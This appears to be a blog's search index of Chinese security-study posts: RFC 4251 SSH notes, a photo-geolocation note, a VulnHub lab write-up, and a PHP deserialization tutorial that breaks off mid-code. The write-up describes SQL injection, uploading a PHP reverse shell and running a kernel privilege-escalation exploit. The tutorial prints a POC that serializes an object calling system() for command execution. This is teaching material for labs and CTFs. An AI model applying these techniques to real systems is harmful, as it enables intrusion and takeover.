<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RFC4251阅后总结</title>
      <link href="/2023/11/11/RFC4251%E9%98%85%E5%90%8E%E6%80%BB%E7%BB%93/"/>
      <url>/2023/11/11/RFC4251%E9%98%85%E5%90%8E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>ps: 线索里的tab键都被吞了，正在处理中</p><hr><h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>来源 <a href="https://datatracker.ietf.org/">https://datatracker.ietf.org</a></p><ul><li>IETF Internet Engineering Task Force</li><li>RFC Request for Comment</li></ul><h1 id="线索"><a href="#线索" class="headerlink" title="线索"></a>线索</h1><span id="more"></span><ul><li><p>设计架构</p><ul><li><p>主机key</p><ul><li>两个信任模型<ul><li>有CA</li><li>无CA</li></ul></li></ul></li><li><p>可拓展性</p><ul><li>方法标识符<ul><li>算法</li><li>认证方式</li></ul></li></ul></li><li><p>策略问题</p><ul><li>加密</li><li>完整性</li><li>压缩</li><li>密钥交换</li><li>公钥算法和格式</li><li>身份认证方式</li><li>The operations that the user is allowed to perform using the<br>connection protocol</li></ul></li><li><p>安全特性<br>- 协商 negotiation</p></li><li><p>本地化和字符集问题</p></li><li><p>数据类型</p><ul><li>比特 byte</li><li>布尔 boolean</li><li>32位无符号整型 uint32</li><li>64位无符号整型 uint64</li><li>字符串 string</li><li>多精度整型 mpint</li><li>列表 name-list</li></ul></li><li><p>算法和方式命名 algorithm and method naming</p><ul><li>implementation自带了一些算法和方式，但是可以自己加</li></ul></li></ul></li><li><p>消息数字标识 Number Message</p><ul><li>传输层协议</li><li>身份认证协议</li><li>连接层协议</li><li>反弹客户端协议 Reversed for client protocol</li><li>本地拓展</li></ul></li><li><p>IANA因素 IANA Consideration </p><ul><li>Internet Assigned Numbers Authority<ul><li><a href="https://www.iana.org/">https://www.iana.org/</a></li><li>The global coordination of the DNS Root, IP addressing, and other Internet protocol resources is performed as the Internet Assigned Numbers Authority (IANA) functions.</li><li>在协议中，其职能是分配协议的名称或专业术语(?)、注册协议(?)</li></ul></li><li>RFC4250——IANA专业术语定义文档</li></ul></li><li><p>协议层次</p><ul><li>传输层协议<ul><li>对服务端的身份认证</li><li>session id (给上层协议使用)</li></ul></li><li>身份认证协议<ul><li>密码认证</li><li>密钥认证</li><li>基于主机的认证</li></ul></li><li>连接协议<ul><li>多路复用</li></ul></li></ul></li><li><p>安全考虑</p><ul><li>伪随机数生成</li><li>控制字符过滤</li><li>传输<ul><li>保密性</li><li>完整性</li><li>replay——确保数据在不同会话间的隔离，防止replay先前会话的数据</li><li>中间人攻击——三种情形</li><li>DOS Denial of Service</li><li>Convert Channals 转换频道？</li><li>前向加密 forward secrecy FS  或完美前向加密 perfect forward secrecy PFS <ul><li>确保即使私钥被泄漏或破解，过去的通信数据依旧不能被解密。一般方法是在非对称加密之前，用仅在通信会话期间有效，并且不会存储在长期存储介质中的临时密钥来加密</li><li>Diffie-Hellman key exchange</li><li>compromise</li></ul></li><li>密钥交换方式提供<ul><li>好像不是安全考虑</li></ul></li><li>流量分析</li></ul></li><li>身份认证<ul><li>弱传输</li><li>调试信息 debug message<ul><li>可能暴露主机信息</li></ul></li><li>公钥认证<ul><li>前提：客户端是没有被渗透，私钥没有被拿到</li><li>需要密码来加密私钥</li><li>smartcards</li></ul></li><li>密码认证<ul><li>前提：服务器是真的</li><li>不然会暴露用户名和密码</li></ul></li><li>基于主机的认证<ul><li>前提：客户端没有被渗透</li></ul></li></ul></li><li>连接<ul><li>端点安全？End Point Security<ul><li>如果服务端被入侵了，终端会话、端口转发、系统访问都被入侵</li><li>如果客户端被入侵了，并且攻击者没被身份认证协议组织，其暴露的服务都容易收到攻击</li></ul></li><li>端口转发？</li><li>X11转发？</li></ul></li></ul></li></ul><p>奇怪的单词<br>    - compromise google翻译上的英语释义是妥协，但是文档中的意思好像是妥协(?)</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>阐述了ssh的设计理念、总体架构和安全考虑，以及延伸了某些技术细节，介绍了更进一步学习的路径</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol><li>什么是CA<ol><li>CA认证的工作原理是什么</li><li>没有CA的那个信任模型到底是怎么工作的</li></ol></li><li>如何自定义算法或认证方式</li><li>什么是IANA<ol><li>其职责或目的是什么</li><li>其产出了什么文档、项目或(其他知识载体)？</li></ol></li><li>什么是IETF<ol><li>其职责或目的是什么</li><li>什么是RFC，我能从中获得什么？</li><li>除了RFC还有什么其他文档或(其他知识载体)？</li></ol></li><li>关于传输层协议<ol><li>如何构建加密session对话的？</li><li>如何确认服务端身份的？</li><li>安全风险在哪里</li><li>算法协商的流程？</li></ol></li><li>关于身份认证协议<ol><li>三种认证方式各自的原理和<em>具体</em>工作流程是什么</li><li>各自的漏洞是什么</li><li>认证协商的流程？</li></ol></li><li>关于连接协议<ol><li>什么是多路复用，具体技术细节和原理是什么？</li></ol></li><li>如何猜解伪随机数<ol><li>当前常用的生成看似随机的伪随机数的算法有哪些？</li></ol></li><li>什么是Convert Channals？</li><li>Diffie-Hellman key exchange原理是什么？</li><li>什么是端口转发和X11转发</li><li>最终问题：从传输层协议到连接协议，一套完整的工作流程是什么<ol><li>常见的ssh工具有哪些</li><li>如何使用这些工具</li><li>wireshark使用技巧有哪些</li><li>如何进行网络编程，用python模拟ssh工作流程</li></ol></li></ol><h1 id="下一跳"><a href="#下一跳" class="headerlink" title="下一跳"></a>下一跳</h1><h2 id="进一步了解ssh"><a href="#进一步了解ssh" class="headerlink" title="进一步了解ssh"></a>进一步了解ssh</h2><p>[SSH-TRANS]——RFC4253<br>[SSH-USERAUTH]——RFC4252<br>[SSH-CONNECT]——RFC4254<br>[SSH-NUMBERS]——RFC4250</p><h2 id="进一步了解IETF、IANA和RFC"><a href="#进一步了解IETF、IANA和RFC" class="headerlink" title="进一步了解IETF、IANA和RFC"></a>进一步了解IETF、IANA和RFC</h2><p>[RFC2119]<br>[RFC2434]</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 理论 </tag>
            
            <tag> 阅后总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>看图识地点</title>
      <link href="/2023/11/05/%E7%9C%8B%E5%9B%BE%E8%AF%86%E5%9C%B0%E7%82%B9/"/>
      <url>/2023/11/05/%E7%9C%8B%E5%9B%BE%E8%AF%86%E5%9C%B0%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这是一个极度简单普通的技术，但其揭示并隐含着通向一条知识的大道<br>这篇文章本身也是极度简陋的，会时不时更新</p><h1 id="训练处"><a href="#训练处" class="headerlink" title="训练处"></a>训练处</h1><p>(暂时不知道有什么比赛)</p><ol><li><a href="https://ctf.show/">https://ctf.show</a> 其中的网络迷踪里的题目很多很有趣，尽管csdn近乎毁了其中的乐趣，不过技术还是值得学习的</li><li><a href="https://www.geoguessr.com/">https://www.geoguessr.com</a> 根据某地的360度图猜地点的游戏</li></ol><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>百度识图<br>搜狗识图<br>google识图 lens.google.com<br>yandox识图 yandox.com&#x2F;images</p><h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>得到一张图片，通常要获得该图片所在地址，难一点就是拍摄时间</p><ol><li>识图工具找到图片来源或者以图搜图的找线索</li><li>找的到或找不到，这都是有可能的</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 社会工程学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术 </tag>
            
            <tag> 浅记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackademic_RTB1_writeup</title>
      <link href="/2023/10/25/hackademic-RTB1-writeup/"/>
      <url>/2023/10/25/hackademic-RTB1-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="hackademic-RTB1-靶机名-writeup"><a href="#hackademic-RTB1-靶机名-writeup" class="headerlink" title="hackademic RTB1_靶机名_writeup"></a>hackademic RTB1_靶机名_writeup</h1><p>这是学校课程的作业，《红队&#x2F;渗透 — 和我一起来打靶》也涉及了该靶机</p><span id="more"></span><h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote><p>靶机名：hackademic RTB1<br>靶机链接：<a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">https://www.vulnhub.com/entry/hackademic-rtb1,17/</a><br>描述：This is the first realistic hackademic challenge (root this box) by mr.pr0n<br>    Download the target and get root.<br>    After all, try to read the contents of the file ‘key.txt’ in the root directory.<br>    Enjoy!</p></blockquote><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><p>ps:具体攻击过程请看<strong>渗透过程及结果</strong></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol><li>nmap扫描端口发现80端口开放，访问自动跳转目录Hackerademic_RTB1</li><li>dirsearch目录遍历，发现文件夹wp-admin，进入后台登陆页面</li><li>访问网页首页，依次点击直到点击<code>Uncategoried</code>，发现参数cat，是有sql注入漏洞的</li></ol><h2 id="拿shell"><a href="#拿shell" class="headerlink" title="拿shell"></a>拿shell</h2><ol><li>sqlmap注入后，查看wordpress数据库下的wp_users，获取网站用户和密码的hash值，通过sqlmap的自带功能爆破hash值获得密码</li><li>GerogeMiller用户的权限较大，登陆后的网页东西更多，可以更改网站设置选项，其中有<code>是否开启upload</code>的选项，也可以设定上传文件的允许格式，这里添加php</li><li>上传kali自带的php反弹shell脚本，目录为<code>/usr/share/webshells/php/php-reverse-shell.php</code>，修改脚本的ip和端口参数为渗透机</li><li>本地nc开启端口监听；网站上传完文件后会提示上传到了哪个目录，直接访问，和本地nc的监听端口连接，getshell</li></ol><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li><code>sudo -l</code>发现当前的用户不是sudoer</li><li>寻找suid可执行文件，也没有找到能用的</li><li><code>uname -a</code>查看当前靶机内核版本，<code>2.6.31.5-127.fc12.1686</code></li><li><code>searchsploit 2.6.3|grep &quot;Local Pri&quot;</code>寻找内核漏洞提取脚本，cp到<code>/var/www/html</code></li><li>渗透机开启apache服务，在拿到的shell上用<code>wget</code>下载内核漏洞脚本，并用靶机的gcc命令编译执行</li><li>15285.c这个脚本可以root靶机 <code>Linux Kernel 2.6.36-rc8 - &#39;RDS Protocal&#39; Local Privilege Escalation</code></li></ol><h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote><p>nmap<br>dirsearch<br>sqlmap<br>kali自带的反弹shell脚本和提取脚本<br>nc监听端口<br>通过渗透机的apache网站下载脚本至靶机<br><code>searchsploit</code><br>内核提取漏洞</p></blockquote><h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><ol><li>信息搜集<br><img src="/2023/10/25/hackademic-RTB1-writeup/1.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/2.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/3.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/4.png"></li><li>sqlmap注入<br><img src="/2023/10/25/hackademic-RTB1-writeup/5.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/6.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/7.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/8.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/9.png"></li><li>上传webshell<br><img src="/2023/10/25/hackademic-RTB1-writeup/10.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/11.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/12.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/13.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/14.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/15.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/16.png"></li><li>getshell和普通的信息搜集<br><img src="/2023/10/25/hackademic-RTB1-writeup/17.png"></li><li>内核漏洞测试，root靶机<br><img src="/2023/10/25/hackademic-RTB1-writeup/18.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/19.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/20.png"><br><img src="/2023/10/25/hackademic-RTB1-writeup/21.png"></li></ol><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><blockquote><p>首先，sqlmap确实是很好用的工具，尤其对我这种手注基础薄弱的人来说更是如此，这是我的短板<br>kali的自带脚本十分的有用，我应该多多了解一下的<br>内核漏洞是十分基础和重要的漏洞利用方式，但是根据系统内核版本模糊地查询漏洞脚本一个一个试——太累了、太慢了、太粗糙了，摸索或学习一套快速方便的工作流因此而言是十分重要的<br>关于内核漏洞的原理，这东西可钻研的东西可多了，但如果真的要学习这个东西：需要扎实的计算机构成原理、系统运行方式基础，这些东西我根本没有</p></blockquote><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>学校给的writeup</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技术 </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化浅记</title>
      <link href="/2023/10/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E8%AE%B0/"/>
      <url>/2023/10/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>关键词：对象、类、成员变量、成员函数、父子类、序列化、反序列化、魔术方法、poc</p><p>感谢让我领略了php反序列化风采的K3zy前辈： <a href="https://github.com/kkontheway">https://github.com/kkontheway</a></p><hr><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>面向对象的是一种编程思想和方法<br>即将数据和操作数据的方法封装成一个对象，来实现具体的功能<br>也就是说对象包含了一些数据和一些函数(即方法)，可以调用对象的成员变量来进行计算，也可以调用对象的成员方法达成某一功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对象这个概念十分的抽象，runoob关于对象的介绍十分的好，但是我觉得有多余的抽象，如果要方便理解这个概念，还是具象一点好，尤其是我不搞开发，不向这种东西注入“心血”</span><br><span class="line">我认为要善于灵活地运用抽象和具象来方便学习</span><br></pre></td></tr></table></figure><p>类是创建对象的模版，对象的创建按照类的结构、包含类的方法(函数)</p><h2 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class 类名 &#123;</span><br><span class="line">成员变量</span><br><span class="line">function 成员方法(形参)&#123;</span><br><span class="line">方法语句; //函数语句</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$变量 = new 类名(穿参);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="对象成员的调用"><a href="#对象成员的调用" class="headerlink" title="对象成员的调用"></a>对象成员的调用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$对象变量-&gt;成员变量 = 1;</span><br><span class="line">$对象变量-&gt;成员函数();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="关于对象的访问控制"><a href="#关于对象的访问控制" class="headerlink" title="关于对象的访问控制"></a>关于对象的访问控制</h2><p><strong>public（公有）：</strong> 公有的类成员可以在任何地方被访问。&#x2F;&#x2F; 如果用var定义那就算public<br><strong>protected（受保护）：</strong> 受保护的类成员则可以被其自身以及其子类和父类访问。<br><strong>private（私有）：</strong> 私有的类成员则只能被其定义所在的类访问。</p><p>以上关于访问控制的“类”可以和”对象“替换</p><h1 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h1><p>只需要知道两个函数和一个核心特性</p><ul><li><strong>serialize()</strong> 函数用于序列化对象或数组，并返回一个字符串，如果对象里有方法，则略过不管</li><li><strong>unserialize()</strong> 函数用于将序列化后的对象或数组进行反序列化，并返回原始的对象结构(不包括方法了)</li><li>核心特性就是，若一个序列化字符串包含了对象a(其结构与类A完全相同)，且发送到了一个php网页被反序列化，同时这个php网页定义了类A，那么这个反序列化后的对象能调用类A的方法了</li></ul><p>对象结构与类结构相同的意思是，对象具有相同的类名和变量名</p><h1 id="浅析序列化字符串"><a href="#浅析序列化字符串" class="headerlink" title="浅析序列化字符串"></a>浅析序列化字符串</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Flag1&#123; </span><br><span class="line">    public $file;  </span><br><span class="line">public $apple=&quot;red and sweet&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Flag02&#123;</span><br><span class="line">public $test;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=new Flag1();</span><br><span class="line">$a-&gt;file=new Flag02();</span><br><span class="line">$a-&gt;file-&gt;test=&quot;I&#x27;m truthleader&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该代码打印的序列化字符串如下：<br><code>O:5:&quot;Flag1&quot;:3:&#123;s:4:&quot;file&quot;;O:6:&quot;Flag02&quot;:1:&#123;s:4:&quot;test&quot;;s:15:&quot;I&#39;m truthleader&quot;;&#125;s:5:&quot;apple&quot;;s:13:&quot;red and sweet&quot;;s:6:&quot;banana&quot;;N;&#125;</code><br>这可以拆分为</p><ul><li>O:5:”Flag1”:2:{}</li><li>:4:”file”;O:6:”Flag02”:1:{}s:5:”apple”;s:13:”red and sweet”;s:6:”banana”;N;</li><li>s:4:”test”;s:15:”I’m truthleader”;</li></ul><ol><li>第一段的O代表对象，5代表对象名的字符数，Flag1是对象名，2代表该对象有两个成员变量，{这里嵌套了两个成员变量}</li><li>第二段的s代表字符串(即变量的数据类型)，file是变量名，而Flag02是值名兼对象名。banana的值的类型是N。{这里的成员变量是一键值对的形式排列的}</li><li>第三段同上</li></ol><h1 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h1><p>具体内容看php官网<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><p>魔法方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。魔术方法与序列化和反序列化强相关<br>魔术方法的名称是固定的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() 执行unserialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__sleep() 执行serialize()时，先会调用这个函数</span><br><span class="line"></span><br><span class="line">__destruct() 对象被销毁时触发</span><br><span class="line"></span><br><span class="line">__call() 在对象上下文中调用不可访问的方法时触发</span><br><span class="line"></span><br><span class="line">__callStatic() 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"></span><br><span class="line">__get() 用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</span><br><span class="line"></span><br><span class="line">__set() 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line">__isset() 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line"></span><br><span class="line">__unset() 在不可访问的属性上使用unset()时触发</span><br><span class="line"></span><br><span class="line">__toString() 把类当作字符串使用时触发</span><br><span class="line"></span><br><span class="line">__invoke() 当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h1 id="POC链"><a href="#POC链" class="headerlink" title="POC链"></a>POC链</h1><p>是一串专门的序列化字符串，传到php网页后解序列化，就能激活php网页中<em>特定对象</em>的魔术方法，从而执行敏感函数，例如读取flag、执行命令或代码</p><p>POC链的结构需要与特定对象一样，即有相同的类名、成员变量名，且包含类所规定的所有成员变量</p><p>POC链的构造需要对php网页代码进行审计，分析类的结构、魔术方法和成员变量间的关系，最终用本地的php脚本生成序列化字符串</p><h2 id="POC链的工作原理"><a href="#POC链的工作原理" class="headerlink" title="POC链的工作原理"></a>POC链的工作原理</h2><ol><li>作为网页的穿参传到php网页</li><li>php网页自动反序列化poc链条(前提是网页确实会反序列化该穿参)</li><li>poc链条符合了魔术方法的发动条件，从而引发了一连串的魔术方法反应，最终执行敏感函数</li></ol><blockquote><p>一般读取文件、执行命令的函数都是敏感函数</p></blockquote><h2 id="生成poc链"><a href="#生成poc链" class="headerlink" title="生成poc链"></a>生成poc链</h2><ol><li>编写php代码，定义类——和目标网页源代码中的类结构要一模一样，严格到大小写也一样</li><li>创建对象，更改对象的成员变量的值，以达到引动魔术方法的目的</li><li>生成序列化字符串</li></ol><h1 id="反序列化例题"><a href="#反序列化例题" class="headerlink" title="反序列化例题"></a>反序列化例题</h1><p>ctfhub上有环境，可以自己做</p><h2 id="2020-网鼎杯-朱雀组-Web-phpweb"><a href="#2020-网鼎杯-朱雀组-Web-phpweb" class="headerlink" title="2020-网鼎杯-朱雀组-Web-phpweb"></a>2020-网鼎杯-朱雀组-Web-phpweb</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        if ($a == &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p = &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func = &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func != &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p = $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func != null) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><p>最简单的，但是有一些弯弯绕绕</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ol><li>页面接受两个POST传参：func p</li><li>call_user_func($func, $p)是敏感函数，其第一个参数是php函数名，第二个参数是函数的传参，其功能就是调用并执行函数</li><li>这确实可以执行函数，但是经过了严格的过滤，当然，file_get_contents和unserialize函数是可以使用的</li><li>原题通过file_get_contents阅读代码</li><li>改网页对func进行了过滤，但是没有对p，同时有一个调用了敏感函数入口gettime的Test类，所以可以手动执行unserialize函数，并构造poc链</li></ol><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test &#123;</span><br><span class="line">var p;</span><br><span class="line">var func; //由于序列化后的对象没有了方法，所以那些多余的东西根本不用写根本不用写</span><br><span class="line">&#125;</span><br><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;p = &quot;pwd&quot;;</span><br><span class="line">$a-&gt;func = &quot;system&quot;;</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br><span class="line">//echo urlencode(serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后传参，func为unserialize，p为poc链，现在可以执行任意系统命令和代码了</p><h2 id="2020-网鼎杯-青龙组-Web-AreUSerialz"><a href="#2020-网鼎杯-青龙组-Web-AreUSerialz" class="headerlink" title="2020-网鼎杯-青龙组-Web-AreUSerialz"></a>2020-网鼎杯-青龙组-Web-AreUSerialz</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 